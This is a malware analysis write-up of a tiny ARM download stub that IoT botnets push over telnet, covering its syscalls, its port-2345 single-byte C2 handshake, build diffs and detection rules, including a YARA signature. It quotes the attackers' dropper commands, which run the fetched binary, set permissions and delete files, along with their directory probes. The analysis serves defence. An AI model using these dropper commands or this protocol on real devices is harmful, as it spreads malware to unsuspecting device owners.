1,300 bytes, three C2s in two weeks

A tiny ARM download stub whose only per-build change is a 4-byte C2 address.

Contents

  • What it does
  • Three builds, one diff
  • Known vs. new
  • Detection

A static ARM ELF of 1,300 bytes, echoed onto telnet-reachable devices. Static analysis only.

What it does

No libc, six syscalls:

  1. socket(AF_INET, SOCK_STREAM)
  2. connect to an IPv4 stored as 4 raw bytes in .data, port 2345
  3. write one byte: 0x04
  4. read 128 bytes at a time and write each chunk to stdout
  5. close, exit(5)

The server sends a binary; the stub just pipes it out. The dropper does the rest:

/bin/busybox chmod 777 .d; ./.d > .f; /bin/busybox chmod 777 .f; ./.f telnet; rm -rf .d

The session first probes writable dirs with >/<dir>/.f && chmod 777 /<dir>/.f && /<dir>/.f, sends /bin/busybox HISILICON as a marker, and reads /proc/cpuinfo. The 0x04 byte is likely an architecture ID; I have no other builds to confirm it.

Three builds, one diff

A new hash each time the server moves. Match on code, not hash.

Eight more tiny ARM ELFs (696–1,452 bytes) turned up between 13 October and 16 November, each in one session at most. Two carry the same port 2345 literal; the rest are truncated or different stubs. On 17 November only one of the eight (00d21a53…, Mirai, 14 Oct) was on MalwareBazaar.

The ThreatFox Aisuru tag on the first C2 is the only attribution I have. Echo-written downloaders are old Mirai tradecraft; the single-byte request on 2345 is the distinctive part.

Detection

  • TCP to port 2345 followed by a client payload of exactly 0x04
  • Telnet input /bin/busybox HISILICON and ./.d > .f
  • ARM ELF under 2 KB with no imports and only socket/connect/read/write syscalls
rule arm_2345_stub
{
    strings:
        $port = { 09 29 00 00 }  // sin_port 2345, literal pool
    condition:
        uint32(0) == 0x464c457f and uint16(0x12) == 0x28
        and filesize < 2KB and $port
}
